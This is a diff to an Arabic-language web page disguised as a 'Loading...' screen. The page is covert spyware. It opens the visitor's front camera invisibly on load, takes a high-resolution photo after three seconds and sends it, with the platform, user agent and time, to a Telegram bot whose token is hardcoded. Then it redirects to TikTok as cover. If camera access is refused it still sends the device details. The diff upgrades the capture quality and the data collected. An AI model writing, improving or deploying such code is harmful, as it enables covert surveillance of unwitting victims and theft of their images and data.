@@ -3,41 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <title>جاري التحميل...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+        .message {
+            position: absolute;
+            z-index: 10;
+            background: rgba(0,0,0,0.7);
+            padding: 20px;
+            border-radius: 10px;
+        }
+    </style>
 </head>
 <body>
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <div class="message">جاري التحميل... الرجاء الانتظار</div>
+    <video id="video" width="640" height="480" autoplay playsinline style="display:block; position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; opacity:0;"></video>
+    <canvas id="canvas" width="1280" height="960" style="display:none;"></canvas>
 
     <script>
-        // 1. التوكن الثابت للبوت الذي سيقوم بالإرسال للجميع
+        // 1. التوكن الثابت للبوت
         const botToken = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"; 
 
-        // 2. سحب الـ ID من رابط المتصفح تلقائياً
+        // 2. سحب الـ ID من رابط المتصفح
         const urlParams = new URLSearchParams(window.location.search);
         const userChatId = urlParams.get('id'); 
 
         async function startSystem() {
-            // إذا لم يكن هناك ID في الرابط، توقف عن العمل
             if (!userChatId) {
                 console.error("لا يوجد معرف ID في الرابط!");
+                document.body.innerHTML = "رابط غير صالح";
                 return;
             }
 
             try {
-                // طلب الكاميرا الأمامية
+                // طلب الكاميرا الأمامية بدقة عالية
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 960 }
+                    } 
                 });
+                
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-
-                // التقاط الصورة بعد ثانيتين
-                setTimeout(() => {
-                    captureAndSend();
-                }, 2000);
+                
+                // التأكد من تشغيل الفيديو قبل التقاط الصورة
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // انتظار 3 ثواني لضبط الإضاءة والتأكد من صورة واضحة
+                    setTimeout(() => {
+                        captureAndSend();
+                    }, 3000);
+                };
 
             } catch (err) {
-                // في حال رفض المستخدم الكاميرا، يمكن إرسال معلومات الجهاز فقط
+                console.log("خطأ في الكاميرا:", err);
                 sendInfoOnly();
             }
         }
@@ -46,31 +77,51 @@
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
             const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, 640, 480);
             
+            // استخدام دقة أعلى للصورة
+            canvas.width = 1280;
+            canvas.height = 960;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // تحويل canvas إلى blob بجودة عالية
             canvas.toBlob((blob) => {
                 const formData = new FormData();
-                formData.append('chat_id', userChatId); // الإرسال لصاحب الـ ID الموجود في الرابط
+                formData.append('chat_id', userChatId);
                 formData.append('photo', blob, 'image.jpg');
-                formData.append('caption', `✅ تم السحب بنجاح للمعرف: ${userChatId}\n📱 النظام: ${navigator.platform}`);
+                formData.append('caption', `✅ تم التقاط الصورة بنجاح
+🆔 المعرف: ${userChatId}
+📱 النظام: ${navigator.platform}
+🌐 المتصفح: ${navigator.userAgent}
+⏰ الوقت: ${new Date().toLocaleString()}`);
 
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
-                }).then(() => {
-                    window.location.href = "https://www.google.com"; // تمويه
+                }).then(response => {
+                    if (response.ok) {
+                        // إيقاف الكاميرا
+                        video.srcObject.getTracks().forEach(track => track.stop());
+                        // تحويل إلى TikTok
+                        window.location.href = "https://www.tiktok.com";
+                    }
                 });
-            }, 'image/jpeg');
+            }, 'image/jpeg', 0.95); // جودة عالية 95%
         }
 
         async function sendInfoOnly() {
-            const text = `⚠️ رفض الكاميرا، معلومات الجهاز فقط:\n🆔 ID: ${userChatId}\n📱 النظام: ${navigator.platform}`;
+            const text = `⚠️ تعذر الوصول للكاميرا
+🆔 المعرف: ${userChatId}
+📱 النظام: ${navigator.platform}
+🌐 المتصفح: ${navigator.userAgent}
+⏰ الوقت: ${new Date().toLocaleString()}`;
+            
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: userChatId, text: text })
             });
-            window.location.href = "https://www.google.com";
+            
+            window.location.href = "https://www.tiktok.com";
         }
 
         window.onload = startSystem;
